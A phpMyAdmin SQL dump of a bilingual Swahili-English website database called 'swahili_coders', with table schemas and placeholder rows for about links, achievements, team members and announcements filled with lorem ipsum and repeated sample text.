-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Oct 19, 2022 at 06:43 AM
-- Server version: 10.4.24-MariaDB
-- PHP Version: 8.1.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `swahili_coders`
--

-- --------------------------------------------------------

--
-- Table structure for table `about_links`
--

CREATE TABLE `about_links` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT 0,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `about_links`
--

INSERT INTO `about_links` (`id`, `title_sw`, `title_en`, `link`, `url`, `url_external`, `active`, `parent`, `position`, `created_at`, `updated_at`) VALUES
(1, 'TIRA Establishment', 'TIRA Establishment', 1, 'pages/tira-establishment', NULL, 1, 0, 1, '2022-02-22 10:19:16', '2022-08-10 14:15:44'),
(2, 'Mission and Vision', 'Mission and Vision', 1, 'pages/mission-and-vision', NULL, 1, 0, 1, '2022-02-22 10:19:36', '2022-08-10 14:16:10'),
(3, 'Objectives and Functions', 'Objectives and Functions', 1, 'pages/our-objectives', NULL, 1, 0, 1, '2022-08-10 14:17:18', '2022-08-10 14:17:18'),
(4, 'Organization Structure', 'Organization Structure', 1, 'pages/organization-structure', NULL, 1, 0, 1, '2022-08-10 14:17:41', '2022-08-10 14:18:13');

-- --------------------------------------------------------

--
-- Table structure for table `achievements`
--

CREATE TABLE `achievements` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `icon` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `color` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `specials` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `achievements`
--

INSERT INTO `achievements` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `photo_url`, `active`, `slug`, `created_at`, `updated_at`, `user_id`, `icon`, `color`, `specials`) VALUES
(1, 'Real Possibilities on Enhancement of the Achievable Estimates', 'Real Possibilities on Enhancement of the Achievable Estimates', NULL, NULL, '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '5d98d83f16201818172542dd6bc9ba14.jpeg', 1, 'real-possibilities-on-enhancement-of-the-achievable-estimates', '2021-08-02 04:59:37', '2022-06-30 17:18:35', 0, 'icon-1646651310', NULL, NULL),
(2, 'Real Possibilities on Enhancement of the Achievable Estimates', 'Real Possibilities on Enhancement of the Achievable Estimates', NULL, NULL, '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '19c85af6feaf700d95b0653f677ebdf9.jpeg', 0, 'real-possibilities-on-enhancement-of-the-achievable-estimates-2', '2021-08-02 05:00:05', '2022-03-07 08:08:06', 0, 'icon-1646651286', NULL, NULL),
(3, 'Real Possibilities on Enhancement of the Achievable Estimates', 'Real Possibilities on Enhancement of the Achievable Estimates', NULL, NULL, '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '70d612c847bc081f67c2abb6dbf83043.jpeg', 1, 'real-possibilities-on-enhancement-of-the-achievable-estimates-3', '2021-08-02 05:03:54', '2022-06-30 17:15:34', 0, 'icon-1646651268', NULL, NULL),
(6, 'Lorem ipsum dolor sit amet consectetur adipisicing elit.', 'Lorem ipsum dolor sit amet consectetur adipisicing elit.', NULL, NULL, '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>', '36ea13cd32bb5e75aaaf4fdee5ffd27f.jpeg', 1, 'lorem-ipsum-dolor-sit-amet-consectetur-adipisicing-elit', '2022-06-30 17:08:49', '2022-06-30 17:08:49', 0, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `activity_log`
--

CREATE TABLE `activity_log` (
  `id` int(10) UNSIGNED NOT NULL,
  `log_name` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `subject_id` int(11) DEFAULT NULL,
  `subject_type` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `causer_id` int(11) DEFAULT NULL,
  `causer_type` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `properties` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `administration_categories`
--

CREATE TABLE `administration_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `featured` tinyint(4) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `administration_categories`
--

INSERT INTO `administration_categories` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `featured`, `slug`, `content`, `active`, `created_at`, `updated_at`) VALUES
(4, 'Swahili Coders Team', 'Swahili Coders Team', 'Swahili Coders Team', 'Swahili Coders Team', 1, 'tira-leaders', NULL, 1, '2022-08-17 08:21:41', '2022-10-15 12:35:38');

-- --------------------------------------------------------

--
-- Table structure for table `administration_categories_members`
--

CREATE TABLE `administration_categories_members` (
  `id` int(11) NOT NULL,
  `category_id` int(11) NOT NULL,
  `member_id` int(11) NOT NULL,
  `title_en` varchar(64) DEFAULT NULL,
  `title_sw` varchar(64) DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT 0,
  `position` int(11) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `administration_categories_members`
--

INSERT INTO `administration_categories_members` (`id`, `category_id`, `member_id`, `title_en`, `title_sw`, `parent`, `position`, `created_at`, `updated_at`) VALUES
(27, 4, 21, 'Developer', 'Developer', 0, 1, '2022-10-15 14:40:27', '2022-10-15 14:40:27'),
(28, 4, 22, 'System Analyst', 'System Analyst', 0, 2, '2022-10-15 14:42:24', '2022-10-15 14:42:24'),
(29, 4, 23, 'Designer', 'Designer', 0, 3, '2022-10-15 14:42:42', '2022-10-15 14:42:42');

-- --------------------------------------------------------

--
-- Table structure for table `administration_members`
--

CREATE TABLE `administration_members` (
  `id` int(10) UNSIGNED NOT NULL,
  `salutation_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `salutation_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `fullname` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `position` int(11) NOT NULL DEFAULT 0,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `slug` text COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `administration_members`
--

INSERT INTO `administration_members` (`id`, `salutation_en`, `salutation_sw`, `fullname`, `position`, `title_sw`, `title_en`, `content_sw`, `content_en`, `photo_url`, `email`, `phone`, `created_at`, `updated_at`, `slug`) VALUES
(21, 'Mr', 'Mr', 'John  Doe', 0, 'Developer', 'Developer', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit,</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit,</p>', '883abc9b1fb0a977ce762096cd61c148.jpeg', 'ipsum@gmail.com', NULL, '2022-10-15 14:36:36', '2022-10-15 14:36:36', 'john-doe'),
(22, 'Ms', 'Ms', 'Jane  Doe', 0, 'System Analyst', 'System Analyst', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit,</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit,</p>', '8cdd02c7c0648cc0441ee253636fead1.jpeg', 'jane@ic.com', NULL, '2022-10-15 14:37:47', '2022-10-15 14:37:47', 'jane-doe'),
(23, 'Ms', 'Ms', 'Ms Jackson', 0, 'Designer', 'Designer', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit,</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit,</p>', '971f86c0694df1649b834fe3634a9075.jpeg', 'msjackson@ink.co.tz', '0692261066', '2022-10-15 14:39:34', '2022-10-15 14:39:34', 'ms-jackson');

-- --------------------------------------------------------

--
-- Table structure for table `announcements`
--

CREATE TABLE `announcements` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `start_date` date DEFAULT NULL,
  `end_date` date DEFAULT NULL,
  `location` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `announcements`
--

INSERT INTO `announcements` (`id`, `title_sw`, `title_en`, `content_sw`, `content_en`, `start_date`, `end_date`, `location`, `file_en`, `file_sw`, `active`, `slug`, `created_at`, `updated_at`) VALUES
(1, 'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC', 'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC', '<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;</p>', '<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;</p>', NULL, NULL, NULL, NULL, NULL, 1, 'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc', '2021-11-01 03:44:12', '2021-11-01 03:44:12'),
(2, 'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ', 'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ', '<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>', '<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>', NULL, NULL, NULL, NULL, NULL, 1, 'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-2', '2021-11-17 03:44:12', '2021-11-17 03:44:12'),
(3, 'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ', 'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ', '<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>', '<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>', NULL, NULL, NULL, NULL, NULL, 1, 'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-3', '2021-11-20 03:44:12', '2021-11-20 03:44:12'),
(4, 'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ', 'Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC ', '<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>', '<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC &nbsp;</p>', NULL, NULL, NULL, NULL, NULL, 1, 'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-4', '2021-11-23 03:44:12', '2021-11-23 03:44:12'),
(5, 'Lorem Ipsum is simply dummy text of the printing and typesetting industry', 'Lorem Ipsum is simply dummy text of the printing and typesetting industry', '<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&nbsp;<strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>', '<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&nbsp;<strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem 